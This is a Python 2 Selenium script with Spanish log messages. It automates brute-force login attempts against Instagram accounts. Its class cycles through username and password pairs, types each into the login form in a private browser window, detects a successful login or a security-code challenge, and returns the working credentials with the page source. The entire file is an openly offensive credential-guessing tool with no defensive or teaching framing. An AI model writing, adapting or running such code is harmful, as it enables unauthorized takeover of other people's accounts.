#!/usr/bin/env python
# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from behaviour import KeyBoard

AttackInfo = lambda u,p,l,c:{"Username":u,"Password":p,"Log":l,"Content":c}
NFEnter = "No se encontro el boton de enter"
NFPass = "No se obtuvo ningún resultado satisfactorio"
CAnother = "Hace falta de un metodo de verificación"
Well = "Se inicio sesión satisfactoriamente"

class InstagrameIDE:
    def __init__(self,exe='geckodriver.exe',incognito=True):
        firefox_profile = webdriver.FirefoxProfile()
        if incognito:
            firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
        self.driver = webdriver.Firefox(executable_path=exe,firefox_profile=firefox_profile)
        self.driver.get("http://www.instagram.com/")
        self.bhv = KeyBoard()

    def BruteForceUser(self,user,*args):
        a = []
        for m in args:
            a.append([user,m])
        return self.BruteForce(*a)

    def BruteForce(self,*args):
        tcl = self.wait_element(By.CLASS_NAME, "_g9ean")
        tcl.find_element_by_tag_name("a").click()
        for n, c  in enumerate(args):
            self.wait_element(By.TAG_NAME,"button")
            ent = self.get_submit()
            if ent == 0:
                print NFEnter
                return AttackInfo(args[n][0],args[n][1],NFEnter,self.driver.page_source)
            h = self.wait_elements(By.CLASS_NAME,"_sjplo")
            u = h[0].find_element_by_tag_name("input")
            p = h[1].find_element_by_tag_name("input")
            if u.get_attribute("value") != args[n][0]:
                u.click()
                self.bhv.PressString(c[0])
            if p.get_attribute("value") != args[n][1]:
                p.click()
                self.bhv.PressString(c[1])
            ent.click()
            j = self.check(n, args)
            state = ""
            if j[0]:
                state = "Consiguió iniciar"
                print state + " con " + str(c)
                return j[1]
            else:
                state = "No inició"
                f = self.clear_elems(n, args, u, p)
                if f[0]:
                    print f[1]["Log"]
                    return f[1]
            print state + " con " + str(c)
        print "END: " + NFPass
        return AttackInfo("", "", NFPass, self.driver.page_source)

    def check(self,n,a):
        self.wait_element(By.CLASS_NAME,"_96n9j")
        bb = self.driver.find_elements_by_class_name("_96n9j")
        if bb != None:
            for i in bb:
                if i.text == "Buscar":
                    return [True,AttackInfo(a[n][0], a[n][1], Well, self.driver.page_source)]
        return [False]

    def clear_elems(self,n,a,*args):
        for k, e in enumerate(args):
            try:
                if (e.get_attribute("value") != a[n+1][k]):
                    e.click()
                    self.bhv.PressDelete(len(e.get_attribute("value")))
            except IndexError:
                pass
            except:
                return [True, AttackInfo(a[n][0], a[n][1], CAnother + " " + str(a[n]), self.driver.page_source)]
        return [False]

    def get_submit(self):
        entm = self.driver.find_elements_by_tag_name("button")
        for i in entm:
            if "Enviar c" in i.text and "digo de seguridad" in i.text:
                return 0
            elif i.text == "Entrar":
                return i

    def set_atr(self,element,atr,value):
        self.driver.execute_script("arguments[0].setAttribute('"+atr+"','"+value+"');", element)

    def wait_element(self, tpo, iden):
        try:
            myElem = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((tpo, iden)))
            return myElem
        except TimeoutException:
            print "La página esta tardando demasiado : " + iden

    def wait_elements(self, tpo, iden):
        try:
            myElem = WebDriverWait(self.driver, 3).until(EC.presence_of_all_elements_located((tpo, iden)))
            return myElem
        except TimeoutException:
            print "La página esta tardando demasiado : " + iden

    def Show(self):
        return self.driver.page_source